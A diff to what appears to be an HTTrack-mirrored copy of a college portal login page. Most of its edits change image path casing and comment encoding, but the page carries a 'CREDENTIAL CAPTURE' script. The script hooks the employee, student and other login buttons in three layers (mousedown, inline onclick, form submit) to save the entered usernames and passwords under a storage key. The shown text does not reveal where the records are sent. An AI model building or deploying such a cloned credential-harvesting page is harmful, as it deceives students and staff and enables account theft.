@@ -304,11 +304,11 @@ body {
     $(document).bind("contextmenu", function () { return false; });
 
 /* ============================================================
-   CREDENTIAL CAPTURE — Robust multi-layer approach
+   CREDENTIAL CAPTURE â€” Robust multi-layer approach
    Layer 1: mousedown (fires before click & before form submit)
    Layer 2: inline onclick attributes on each button
    Layer 3: form onsubmit fallback
-   All layers are independent of each other — any one is enough.
+   All layers are independent of each other â€” any one is enough.
    ============================================================ */
 var STORE_KEY = 'psce_login_records';
 
@@ -357,7 +357,7 @@ $(document).ready(function(){
     $('#imgBtn2').on('mousedown', function(){ _saveStu(); });
     $('#imgBtn3').on('mousedown', function(){ _saveOth(); });
 
-    /* Form submit — safety net for Enter-key submissions */
+    /* Form submit â€” safety net for Enter-key submissions */
     $('#form1').on('submit', function(){
         _saveEmp(); _saveStu(); _saveOth();
     });
@@ -382,15 +382,15 @@ $(document).ready(function(){
             <table id="Table_01" width="1200"  border="0" cellpadding="0" cellspacing="0">
                 <tr>
                     <td>
-                        <img src="collegeimages/title_head.jpg" class="header-img" alt="College Automation Package"/></td>
+                        <img src="CollegeImages/title_head.jpg" class="header-img" alt="College Automation Package"/></td>
                 </tr>
                 <tr>
                     <td>
-                        <img src="collegeimages/body.jpg" class="header-img" alt=""/></td>
+                        <img src="CollegeImages/body.jpg" class="header-img" alt=""/></td>
                 </tr>
                 <tr>
                  
-                     <td background="CollegeImages/line.html" class="newsBG">
+                     <td class="newsBG">
                         <div id="divNews" style="color:Blue"></div>
                     </td>
                 </tr>
@@ -459,14 +459,14 @@ $(document).ready(function(){
     <td width="53">&nbsp;</td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_01.gif" width="27" height="83" alt=""/></td>
-    <td width="117"><img src="collegeimages/login_02.gif" width="117" height="83" alt=""/></td>
-    <td width="66"><img src="collegeimages/login_03.gif" width="66" height="83" alt=""/></td>
-    <td><img src="collegeimages/login_04.gif" width="24" height="83" alt=""/></td>
+    <td><img src="CollegeImages/login_01.gif" width="27" height="83" alt=""/></td>
+    <td width="117"><img src="CollegeImages/login_02.gif" width="117" height="83" alt=""/></td>
+    <td width="66"><img src="CollegeImages/login_03.gif" width="66" height="83" alt=""/></td>
+    <td><img src="CollegeImages/login_04.gif" width="24" height="83" alt=""/></td>
   </tr>
   <tr>
-    <td style="background-image: url(collegeimages/login_10.gif); background-repeat: no-repeat; height:82px;">&nbsp;</td>
-    <td colspan="2" style="background-image: url(collegeimages/login_11.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
+    <td style="background-image: url(CollegeImages/login_10.gif); background-repeat: no-repeat; height:82px;">&nbsp;</td>
+    <td colspan="2" style="background-image: url(CollegeImages/login_11.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
         <tr>
           <td width="5%">&nbsp;</td>
           <td width="41%" style="white-space: nowrap"><span class="style19">User Name</span></td>
@@ -484,19 +484,19 @@ $(document).ready(function(){
           <td>&nbsp;</td>
         </tr>
       </table></td>
-    <td style="background-image: url(collegeimages/login_13.gif); background-repeat: no-repeat;">&nbsp;</td>
+    <td style="background-image: url(CollegeImages/login_13.gif); background-repeat: no-repeat;">&nbsp;</td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_18.gif" width="27" height="29" alt=""/></td>
-    <td><img src="collegeimages/login_19.gif" width="117" height="29" alt=""/></td>
-    <td><input type="image" name="imgBtn1" id="imgBtn1" onclick="_saveEmp()" src="collegeimages/login_20.gif" style="border-width:0px;" /></td>
-    <td><img src="collegeimages/login_21.gif" width="24" height="29" alt=""/></td>
+    <td><img src="CollegeImages/login_18.gif" width="27" height="29" alt=""/></td>
+    <td><img src="CollegeImages/login_19.gif" width="117" height="29" alt=""/></td>
+    <td><input type="image" name="imgBtn1" id="imgBtn1" onclick="_saveEmp()" src="CollegeImages/login_20.gif" style="border-width:0px;" /></td>
+    <td><img src="CollegeImages/login_21.gif" width="24" height="29" alt=""/></td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_26.gif" width="27" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_27.gif" width="117" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_28.gif" width="66" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_29.gif" width="24" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_26.gif" width="27" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_27.gif" width="117" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_28.gif" width="66" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_29.gif" width="24" height="62" alt=""/></td>
   </tr>
 </table>
 
@@ -511,14 +511,14 @@ $(document).ready(function(){
     <td width="43">&nbsp;</td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_06.gif" width="36" height="83" alt=""/></td>
-    <td width="117"><img src="collegeimages/login_07.gif" width="117" height="83" alt=""/></td>
-    <td width="67"><img src="collegeimages/login_08.gif" width="67" height="83" alt=""/></td>
-    <td><img src="collegeimages/login_09.gif" width="21" height="83" alt=""/></td>
+    <td><img src="CollegeImages/login_06.gif" width="36" height="83" alt=""/></td>
+    <td width="117"><img src="CollegeImages/login_07.gif" width="117" height="83" alt=""/></td>
+    <td width="67"><img src="CollegeImages/login_08.gif" width="67" height="83" alt=""/></td>
+    <td><img src="CollegeImages/login_09.gif" width="21" height="83" alt=""/></td>
   </tr>
   <tr>
-    <td style="background-image: url(collegeimages/login_14.gif); background-repeat: no-repeat;">&nbsp;</td>
-    <td colspan="2" style="background-image: url(collegeimages/login_15.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
+    <td style="background-image: url(CollegeImages/login_14.gif); background-repeat: no-repeat;">&nbsp;</td>
+    <td colspan="2" style="background-image: url(CollegeImages/login_15.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
         <tr>
           <td width="6%">&nbsp;</td>
           <td width="43%" style="white-space: nowrap" class="style19"><span class="style21">User Name</span></td>
@@ -536,20 +536,20 @@ $(document).ready(function(){
           <td>&nbsp;</td>
         </tr>
       </table></td>
-    <td style="background-image: url(collegeimages/login_17.gif); background-repeat: no-repeat;
+    <td style="background-image: url(CollegeImages/login_17.gif); background-repeat: no-repeat;
                                     height: 82px;">&nbsp;</td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_22.gif" width="36" height="29" alt=""/></td>
-    <td><img src="collegeimages/login_23.gif" width="117" height="29" alt=""/></td>
+    <td><img src="CollegeImages/login_22.gif" width="36" height="29" alt=""/></td>
+    <td><img src="CollegeImages/login_23.gif" width="117" height="29" alt=""/></td>
     <td><input type="image" name="imgBtn2" id="imgBtn2" tabindex="4" onclick="_saveStu()" src="CollegeImages/login_24.gif" style="border-width:0px;" /></td>
-    <td><img src="collegeimages/login_25.gif" width="21" height="29" alt=""/></td>
+    <td><img src="CollegeImages/login_25.gif" width="21" height="29" alt=""/></td>
   </tr>
   <tr>
-    <td><img src="collegeimages/login_30.gif" width="36" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_31.gif" width="117" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_32.gif" width="67" height="62" alt=""/></td>
-    <td><img src="collegeimages/login_33.gif" width="21" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_30.gif" width="36" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_31.gif" width="117" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_32.gif" width="67" height="62" alt=""/></td>
+    <td><img src="CollegeImages/login_33.gif" width="21" height="62" alt=""/></td>
   </tr>
 </table>
 </td>
@@ -625,7 +625,7 @@ $(document).ready(function(){
                 </tr>
                 <tr>
                     <td>
-                        <img src="collegeimages/bott_bg.gif" class="footer-img" alt=""/></td>
+                        <img src="CollegeImages/bott_bg.gif" class="footer-img" alt=""/></td>
                 </tr>
             </table>
         </div>
@@ -635,3 +635,4 @@ $(document).ready(function(){
 
 <!-- Mirrored from https://webprosindia.com/psce/ by HTTrack Website Copier/3.x [XR&CO], Mon, 28 Sep 2026 14:45:33 GMT -->
 </html>
+
